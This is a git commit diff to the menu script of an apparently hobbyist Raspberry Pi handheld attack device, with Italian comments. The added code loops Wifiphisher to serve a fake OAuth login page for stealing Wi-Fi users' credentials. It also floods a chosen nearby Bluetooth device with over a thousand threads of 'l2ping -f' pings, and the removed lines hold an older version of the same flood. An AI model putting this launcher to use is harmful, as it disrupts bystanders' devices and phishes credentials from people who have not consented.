bbb04816d3bae0649e09054c0859bc5bed1efbf3
lif28 <160417499+Lif28@users.noreply.github.com>
2024-10-29 20:44:54 +0000

    Update menu.py

--- src/nevermind/menu.py
+++ src/nevermind/menu.py
@@ -1,269 +1,53 @@
 import RPi.GPIO as GPIO
-from PIL import Image, ImageDraw, ImageFont
-import LCD_1in44
 import time
 import os
-import threading
 import subprocess
-import hashlib
+import socket
+import sys
+import threading
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
-from libraries import ddos_bluetooth
-from libraries.ddos_bluetooth import ddos
+from lib import dos_bluetooth
+from lib.dos_bluetooth import dos
 import functools
+from lib.mojstd import *
 
-# Pin setup
-KEY_UP_PIN = 6
-KEY_DOWN_PIN = 19
-KEY_LEFT_PIN = 5
-KEY_RIGHT_PIN = 26
-KEY_PRESS_PIN = 13
-KEY1_PIN = 21
-KEY2_PIN = 20
-KEY3_PIN = 16
-
-# Initialize GPIO
-GPIO.setmode(GPIO.BCM)
-GPIO.setup(KEY_UP_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
-GPIO.setup(KEY_DOWN_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
-GPIO.setup(KEY_LEFT_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
-GPIO.setup(KEY_RIGHT_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
-GPIO.setup(KEY_PRESS_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
-GPIO.setup(KEY1_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
-GPIO.setup(KEY2_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
-GPIO.setup(KEY3_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
-
-# Initialize display
-disp = LCD_1in44.LCD()
-Lcd_ScanDir = LCD_1in44.SCAN_DIR_DFT
-disp.LCD_Init(Lcd_ScanDir)
-disp.LCD_Clear()
-
-#Clear variables
-selected_index = 0
-menu_options = []
-
-@functools.lru_cache(maxsize=128)
-def prssd_key(a,b):
-    while True:
-        if GPIO.input(KEY_UP_PIN) == 0:
-            a = (a - 1) % len(b)
-            draw_menu(a)
-            time.sleep(0.3)
-        if GPIO.input(KEY_DOWN_PIN) == 0:
-            a = (a + 1) % len(b)
-            draw_menu(a)
-            time.sleep(0.3)
-        if GPIO.input(KEY_PRESS_PIN) == 0:
-            break
-
-def DOS(mac):
-    DOS = subprocess.run(["sudo","l2ping", "s", "600", "f", mac])
-
-
-def draw_file_menu(files, selected_index):
-    """Draw the file menu on the display in a grid format."""
-    draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
-
-    # Definire dimensioni della griglia
-    num_cols = 3  # Numero di colonne
-    num_rows = 4  # Numero di righe
-    item_width = width // num_cols
-    item_height = 20  # Altezza dell'elemento, puoi modificarlo se necessario
-
-    for i, file in enumerate(files):
-        col = i % num_cols
-        row = i // num_cols
-        x = col * item_width
-        y = row * item_height
-
-        if i == selected_index:
-            text_size = draw.textbbox((0, 0), file, font=font)
-            text_width = text_size[2] - text_size[0]
-            text_height = text_size[3] - text_size[1]
-            draw.rectangle((x, y, x + item_width, y + item_height), fill=(0, 255, 0))  # Evidenziare lo sfondo
-            draw.text((x + 1, y + 1), file, font=font, fill=(0, 0, 0))  # Testo in nero
-        else:
-            draw.text((x + 1, y + 1), file, font=font, fill=(255, 255, 255))  # Testo in bianco
-
-    disp.LCD_ShowImage(image, 0, 0)
-
-# Display logo at startup
-
-
-# Create blank image for drawing
-width = 128
-height = 128
-image = Image.new('RGB', (width, height))
-
-# Get drawing object to draw on image
-draw = ImageDraw.Draw(image)
-font = ImageFont.load_default()
-
-def draw_keyboard(selected_key_index, input_text, mode="alpha", caps_lock=False):
-    if mode == "alpha":
-        keys = [
-            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
-            'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
-            'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';',
-            'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/',
-            ' ', 'DEL', '⏎', "!#1", "CAPS"
-        ]
-    else:  # special characters mode
-        keys = [
-            '!', '"', '£', '$', '%', '&', '/', '(', ')', '=',
-            '?', '^', '@', '#', '_', '-', '+', '{', '}', '\\',
-            '[', ']', '*', ':', ';', "'", '<', '>', '|', '~',
-            ' ', 'DEL', '⏎', "ABC", "CAPS"
-        ]
-
-    if caps_lock:
-        keys = [key.upper() if key.isalpha() else key for key in keys]
-
-    key_width = 12
-    key_height = 12
-    cols = 10
-
-    # Clear previous image
-    draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
-
-    # Draw the current input text
-    draw.text((0, 0), input_text, font=font, fill=(255, 255, 255))
-
-    # Draw the keyboard
-    for i, key in enumerate(keys):
-        col = i % cols
-        row = i // cols
-        x = col * key_width
-        y = (row + 1) * key_height  # Start drawing from second row
-        if i == selected_key_index:
-            draw.rectangle((x, y, x + key_width, y + key_height), fill=(0, 255, 0))  # Highlight selected key
-            draw.text((x + 2, y + 2), key, font=font, fill=(0, 0, 0))
-        else:
-            draw.rectangle((x, y, x + key_width, y + key_height), outline=(255, 255, 255))
-            draw.text((x + 2, y + 2), key, font=font, fill=(255, 255, 255))
-
-    # Display the updated image
-    disp.LCD_ShowImage(image, 0, 0)
-
-def get_keyboard_input():
-    alpha_keys = [
-        '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
-        'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
-        'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';',
-        'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/',
-        ' ', 'DEL', '⏎', "!#1", "CAPS"
-    ]
-    special_keys = [
-        '!', '"', '£', '$', '%', '&', '/', '(', ')', '=',
-        '?', '^', '@', '#', '_', '-', '+', '{', '}', '\\',
-        '[', ']', '*', ':', ';', "'", '<', '>', '|', '~',
-        ' ', 'DEL', '⏎', "ABC", "CAPS"
-    ]
-
-    input_text = ""
-    selected_key_index = 0
-    mode = "alpha"
-    caps_lock = False
-
-    draw_keyboard(selected_key_index, input_text, mode, caps_lock)
-
-    while True:
-        if GPIO.input(KEY_UP_PIN) == 0:
-            selected_key_index = (selected_key_index - 10) % len(alpha_keys)
-            draw_keyboard(selected_key_index, input_text, mode, caps_lock)
-            time.sleep(0.3)
-        if GPIO.input(KEY_DOWN_PIN) == 0:
-            selected_key_index = (selected_key_index + 10) % len(alpha_keys)
-            draw_keyboard(selected_key_index, input_text, mode, caps_lock)
-            time.sleep(0.3)
-        if GPIO.input(KEY_LEFT_PIN) == 0:
-            selected_key_index = (selected_key_index - 1) % len(alpha_keys)
-            draw_keyboard(selected_key_index, input_text, mode, caps_lock)
-            time.sleep(0.3)
-        if GPIO.input(KEY_RIGHT_PIN) == 0:
-            selected_key_index = (selected_key_index + 1) % len(alpha_keys)
-            draw_keyboard(selected_key_index, input_text, mode, caps_lock)
-            time.sleep(0.3)
-
-        # Verifica dell'input dei tasti speciali
-        if GPIO.input(KEY1_PIN) == 0:  # Se KEY1 (P21) è premuto, cancella l'ultimo carattere
-            input_text = input_text[:-1]
-            draw_keyboard(selected_key_index, input_text, mode, caps_lock)
-            time.sleep(0.3)
-
-        if GPIO.input(KEY2_PIN) == 0:  # Se KEY2 (P20) è premuto, aggiungi uno spazio
-            input_text += ' '
-            draw_keyboard(selected_key_index, input_text, mode, caps_lock)
-            time.sleep(0.3)
-
-        if GPIO.input(KEY3_PIN) == 0:  # Se KEY3 (P16) è premuto, conferma l'input
-            return input_text
-
-        # Gestione dell'input del pulsante di selezione (KEY_PRESS_PIN)
-        if GPIO.input(KEY_PRESS_PIN) == 0:
-            key = alpha_keys[selected_key_index] if mode == "alpha" else special_keys[selected_key_index]
-            if key == "DEL":
-                input_text = input_text[:-1]
-            elif key == "⏎":
-                return input_text
-            elif key == "!#1":
-                mode = "special" if mode == "alpha" else "alpha"
-            elif key == "CAPS":
-                caps_lock = not caps_lock
-            else:
-                input_text += key.upper() if caps_lock else key
-
-            draw_keyboard(selected_key_index, input_text, mode, caps_lock)
-            time.sleep(0.3)
-
-menu_options = ["Networks","Bluetooth", "Payload", "Party", "App & Plugin", "Shutdown"]
-selected_index = 0
-def show_image(image_path, exit_event=None):
-    image = Image.open(image_path)
-    image = image.resize((128, 128))  # Resize the image to fit the display if necessary
-
-    disp.LCD_Clear()  # Clear the display
-    disp.LCD_ShowImage(image, 0, 0)  # Show the image on the display
-
-    # Wait for exit event (e.g., button press or timeout)
-    while True:
-        if exit_event is not None and exit_event():
-            break  # Exit the loop if exit event occurs
-        time.sleep(0.1)  # Adjust sleep time as needed
-
-    disp.LCD_Clear()  # Clear the display after exit
-
+scroll_offset = 0
+max_visible_options = 7
+#@functools.lru_cache(maxsize=236)
 def draw_menu(selected_index):
-
-    # Clear the screen
+    global scroll_offset
     draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
 
-    for i, option in enumerate(menu_options):
-        y = i * 20  # Spacing between menu items
+    # Determina quante opzioni sono fuori dallo schermo e gestisce lo scorrimento
+    total_options = len(menu_options)
 
+    # Controlla se bisogna scorrere in basso o in alto
+    if selected_index < scroll_offset:
+        scroll_offset = selected_index
+    elif selected_index >= scroll_offset + max_visible_options:
+        scroll_offset = selected_index - max_visible_options + 1
+
+    # Calcola l'offset per le opzioni del menu
+
+    for i in range(scroll_offset, min(scroll_offset + max_visible_options, total_options)):
+        y = ((i - scroll_offset) * 20) # Spacing between menu items with offset
+        option = menu_options[i]
         if i == selected_index:
             text_size = draw.textbbox((0, 0), option, font=font)
             text_width = text_size[2] - text_size[0]
             text_height = text_size[3] - text_size[1]
-            draw.rectangle((0, y, width, y + text_height), fill=(0, 255, 0))  # Highlight background
+            draw.rectangle((0, y, width, y + text_height), fill=(0, 255, 0)) #Highlight background
             draw.text((1, y), option, font=font, fill=(0, 0, 0))  # Text in black
-
         else:
             draw.text((1, y), option, font=font, fill=(255, 255, 255))  # Text in white
 
+    # Display the updated image
     disp.LCD_ShowImage(image, 0, 0)
 
-def show_message(message, duration=2):
-    draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))  # Clear previous image
-    draw.text((10, 50), message, font=font, fill=(255, 255, 255))
-    disp.LCD_ShowImage(image, 0, 0)
-    time.sleep(duration)
-    disp.LCD_Clear()
-
-#returner()
-
+menu_options = ["Networks","Bluetooth", "Payload", "Party", "App & Plugin", "Shutdown"]
+selected_index = 0
 
 
 
@@ -273,7 +57,6 @@ def show_message(message, duration=2):
                                         # THE WHILE#
 
 #############################################################################################
-
 
 
 
@@ -292,6 +75,7 @@ while True:
         time.sleep(0.3)
 
     elif GPIO.input(KEY_PRESS_PIN) == 0:
+
         selected_option = menu_options[selected_index]
 
         if selected_option == "Networks":
@@ -300,9 +84,10 @@ while True:
             selected_index = 0
 
             # NETWORKS
-
+            time.sleep(0.25)
             while True:
                 draw_menu(selected_index)
+
 
                 if GPIO.input(KEY_UP_PIN) == 0:
                     selected_index = (selected_index - 1) % len(menu_options)
@@ -323,8 +108,10 @@ while True:
 
                         #WIFI
 
+                        time.sleep(0.30)
                         while True:
                             draw_menu(selected_index)
+
 
                             if GPIO.input(KEY_UP_PIN) == 0:
                                 selected_index = (selected_index - 1) % len(menu_options)
@@ -339,24 +126,30 @@ while True:
                             elif GPIO.input(KEY_PRESS_PIN) == 0:
                                 selected_option = menu_options[selected_index]
 
-                                if selected_option == "Pwnagotchi":
-                                    menu_options = ["Pwnagotchi", "Wifiphisher"]
-                                    selected_index = 0
-                                    show_message("TEST PASSED")
-                                    time.sleep(5)
+                                if selected_option == "Wifiphisher":
+                                    #menu_options = ["Pwnagotchi", "Wifiphisher"]
+                                    #selected_index = 0
 
-                                    quit()
+                                    while True:
+                                        os.system('sudo wifiphisher -e "nevergonnagive" -p oauth-login > wifiphisher.log 2>&1')
+                                        show_message("DOING WIFI", 3)
+
+                                        show_message("WIFIPHISHER")
+
+
 
 
         elif selected_option == "Bluetooth":
             # Draw and handle the Network sub-menu
             menu_options = ["Dos", "Ddos"]
             selected_index = 0
-
+            time.sleep(0.20)
             #
 
             while True:
+
                 draw_menu(selected_index)
+
 
                 if GPIO.input(KEY_UP_PIN) == 0:
                         selected_index = (selected_index - 1) % len(menu_options)
@@ -379,31 +172,42 @@ while True:
                         menu_options = []
                         selected_index = 0
 
-                        ddos().main()       #Scan for mac address
-                        for i in ddos_bluetooth.mac_addrs:
+                        dos().main()       #Scan for mac address
+                        for i in dos_bluetooth.mac_addrs:
                             menu_options.append(i)
 
+                        time.sleep(0.25)
                         while True:
                             draw_menu(selected_index)
+
 
                             if GPIO.input(KEY_UP_PIN) == 0:
                                 selected_index = (selected_index - 1) % len(menu_options)
                                 draw_menu(selected_index)
-                                time.sleep(0.3)
 
                             elif GPIO.input(KEY_DOWN_PIN) == 0:
                                 selected_index = (selected_index + 1) % len(menu_options)
                                 draw_menu(selected_index)
-                                time.sleep(0.3)
 
                             elif GPIO.input(KEY_PRESS_PIN) == 0:
                                 selected_option = menu_options[selected_index]
 
                                 while True:
                                     try:
-                                        mac = selected_option
-                                        for i in range(0,1025, 1):
-                                            threading.Thread(target=DOS, args=[str(mac),str("600")]).start()
+                                        mac = str(selected_option)
+                                        print(mac)
+                                        def DOS(mac):
+                                            os.system("sudo " + "hciconfig " + "hci0 " + "up")
+                                            os.system('sudo ' + 'l2ping -i hci0 -s ' + "600" +' -f ' + mac)
+
+                                        for i in range(0, 1025, 1):
+                                            show_message(f"""Dossing
+{mac} . . .""")
+                                            threading.Thread(target=DOS, args=[str(mac)]).start()
+                                            if GPIO.input(KEY3_PIN) == 0:
+                                                show_message("Exiting", 1)
+                                                break
+                                        break
 
                                     except:
                                         show_message("Error: HOST IS DOWN" ,1)
